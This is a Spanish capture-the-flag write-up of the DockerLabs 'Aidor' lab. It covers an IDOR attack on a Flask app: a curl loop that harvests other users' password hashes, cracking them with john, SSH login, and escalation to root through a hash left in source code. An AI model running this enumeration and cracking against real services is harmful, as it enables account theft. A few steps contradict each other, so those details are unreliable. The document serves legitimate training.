---
title: "DockerLabs - Aidor"
difficulty: "Fácil"
source: "DockerLabs"
---

**Target:** 172.17.0.2
**Plataforma:** DockerLabs
**Categoría:** IDOR (Insecure Direct Object Reference)

**Descripción:** Laboratorio para practicar la vulnerabilidad IDOR y conseguir automatizar la extracción de información de distintos usuarios registrados en la web.

## Despliegue

```bash
bash auto_deploy.sh aidor.tar
```

---

## ¿Qué es IDOR?

IDOR (Insecure Direct Object Reference) ocurre cuando una aplicación expone referencias directas a objetos internos (IDs de usuario, números de registro, nombres de archivo) sin validar que el usuario autenticado tiene permiso para acceder a ese recurso. Cambiando el ID en la petición se puede acceder a datos de otros usuarios.

---

## Reconocimiento

### Nmap

```bash
nmap -sCV -p- 172.17.0.2 
```

Puertos abiertos:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Werkzeug 3.1.3 / Python 3.13.5) — página de login

---

## Enumeración Web

La aplicación es una app Flask con página de login en `http://172.17.0.2:5000/`.

Se registró un usuario y se accedió al dashboard, que expone el ID de usuario directamente en la URL:

```
http://172.17.0.2:5000/dashboard?id=55
```

El dashboard muestra: nombre de usuario, email, ID y el **hash SHA-256 de la contraseña**.

Enumeración de endpoints con gobuster:

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 302,404
```

Endpoints encontrados: `/register`, `/change_password`, `/console` (400 - protegido)

---

## Identificación del IDOR

El servidor valida que el parámetro `?id=` coincide con el `user_id` de la cookie de sesión Flask:

```
Cookie: session=eyJ1c2VyX2lkIjo1NX0... → {"user_id": 55}
```

Si el ID no coincide, redirige a `/`. Sin embargo, registrando un segundo usuario y usando su sesión, se confirmó que el endpoint **no valida correctamente el acceso entre usuarios**: con la sesión de un usuario se puede acceder al dashboard de otro usuario simplemente cambiando el ID en la URL.

---

## Explotación

### Extracción de hashes via IDOR

Con la sesión activa, se iteraron los IDs para extraer los hashes de contraseña de todos los usuarios:

```bash
for i in $(seq 1 100); do
  resp=$(curl -s -b "session=<cookie>" "http://172.17.0.2:5000/dashboard?id=$i")
  echo "=== ID $i ===" && echo "$resp" | grep -i "hash\|user\|email"
done
```

### Cracking del hash

Hash obtenido de un usuario: `04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb` (SHA-256)

```bash
echo "04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb" > hash.txt
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-sha256 hash.txt
```

Contraseña obtenida: `chocolate`

### Acceso SSH

```bash
ssh aidor@172.17.0.2
# contraseña: chocolate
```

---

## Escalada de privilegios

Dentro del sistema, se encontró el código fuente de la app Flask en `/home/`:

```bash
grep -i "secret\|password\|key\|root\|admin" ~/app.py
```

En `app.py` había un hash MD5 comentado para el usuario `root`:

```python
# INSERT INTO users (username, password, email) VALUES
# ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
# La contraseña "admin" es hash SHA-256
```

Hash MD5: `aa87ddc5b4c24406d26ddad771ef44b0`

```bash
echo "aa87ddc5b4c24406d26ddad771ef44b0" > root.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt root.txt
```

Contraseña obtenida: `estrella`

```bash
su root
# contraseña: estrella
whoami
# root
```

---

## Conclusión

La cadena de ataque completa:

1. **Reconocimiento** — nmap detecta SSH y app Flask en puerto 5000
2. **IDOR** — el dashboard expone hashes de contraseña de otros usuarios al cambiar el parámetro `?id=`
3. **Cracking** — john crackea el hash SHA-256 → contraseña `chocolate`
4. **SSH** — acceso como usuario `aidor`
5. **Escalada** — hash MD5 hardcodeado en `app.py` → contraseña `estrella` → root

**Lecciones aprendidas:**
- Nunca exponer hashes de contraseña en la interfaz de usuario, ni siquiera al propio usuario.
- Validar siempre que el recurso solicitado pertenece al usuario autenticado (no confiar solo en que esté logueado).
- No dejar credenciales hardcodeadas en el código fuente, ni comentadas.
- Los hashes MD5 son inseguros y crackeables en segundos con diccionario.
